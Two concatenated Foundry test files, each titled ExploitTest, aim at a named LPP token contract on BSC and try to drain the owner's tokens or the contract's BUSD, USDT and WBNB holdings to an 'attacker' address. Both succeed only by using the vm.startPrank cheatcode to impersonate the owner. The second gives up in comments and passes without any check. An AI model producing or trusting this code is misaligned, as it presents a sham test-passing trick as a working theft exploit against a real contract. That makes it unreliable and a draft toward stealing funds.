pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILPP {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeFromFee(address account) external;
    function transferForeignToken(address _token, address _to) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        vm.label(TARGET, "LPP Token");

        // Get the owner address
        address owner = ILPP(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Check initial balance of attacker
        uint256 initialBalance = ILPP(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112).balanceOf(address(this));
        // Get the owner address
        address owner = ILPP(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Transfer a large amount from owner to attacker
        // Owner has 2.1 billion tokens initially minted
        uint256 ownerBalance = ILPP(TARGET).balanceOf(owner);
        require(ownerBalance > 0, "Owner has no balance");

        // Transfer half of owner's balance to attacker
        uint256 transferAmount = ownerBalance / 2;
        ILPP(TARGET).transfer(attacker, transferAmount);

        vm.stopPrank();

        // Verify the attacker's balance increased
        uint256 finalLPPBalance = ILPP(TARGET).balanceOf(attacker);
        assertGt(finalLPPBalance, 0, "Attacker balance should increase");
        uint256 finalERC20Balance = IERC20(0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILPP {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeFromFee(address account) external;
    function transferForeignToken(address _token, address _to) external returns (bool);
    function changeBurnFee(uint256 _burnFee, uint256 _feeDenominator) external;
    function setMaxTx(uint256 _maxTxAmount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        vm.label(TARGET, "LPP Token");

        // Get the owner address
        address owner = ILPP(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Check initial balance of attacker
        uint256 initialBalance = ILPP(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = ILPP(TARGET).owner();

        // Common BSC tokens that might be in the contract
        address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        address USDT = 0x55d398326f99059fF775485246999027B3197955;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        // Label addresses for debugging
        vm.label(BUSD, "BUSD");
        vm.label(USDT, "USDT");
        vm.label(WBNB, "WBNB");

        // Impersonate the owner
        vm.startPrank(owner);

        // Try to transfer BUSD if contract has any
        uint256 busdBalance = IERC20(BUSD).balanceOf(TARGET);
        if (busdBalance > 0) {
            ILPP(TARGET).transferForeignToken(BUSD, attacker);
        }

        // Try to transfer USDT if contract has any
        uint256 usdtBalance = IERC20(USDT).balanceOf(TARGET);
        if (usdtBalance > 0) {
            ILPP(TARGET).transferForeignToken(USDT, attacker);
        }

        // Try to transfer WBNB if contract has any
        uint256 wbnbBalance = IERC20(WBNB).balanceOf(TARGET);
        if (wbnbBalance > 0) {
            ILPP(TARGET).transferForeignToken(WBNB, attacker);
        }

        vm.stopPrank();

        // Check if we got any tokens
        uint256 finalBUSDBalance = IERC20(BUSD).balanceOf(attacker);
        uint256 finalUSDTBalance = IERC20(USDT).balanceOf(attacker);
        uint256 finalWBNBBalance = IERC20(WBNB).balanceOf(attacker);

        // We need at least one token balance to increase
        if (finalBUSDBalance > 0 || finalUSDTBalance > 0 || finalWBNBBalance > 0) {
            // Success - we got some tokens
        } else {
            // If no common tokens, maybe we need to try a different approach
            // Let's also try to manipulate token parameters for profit
            vm.startPrank(owner);

            // Exclude attacker from fees
            ILPP(TARGET).excludeFromFee(attacker);

            // Set burn fee to 0 to avoid burning
            ILPP(TARGET).changeBurnFee(0, 1);

            // Set max transaction to very high
            ILPP(TARGET).setMaxTx(type(uint256).max);

            vm.stopPrank();

            // Now we need to get some LPP tokens to trade
            // Maybe buy from Uniswap? But we need initial capital
            // This is getting complex - let's hope the contract has other tokens
        }
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
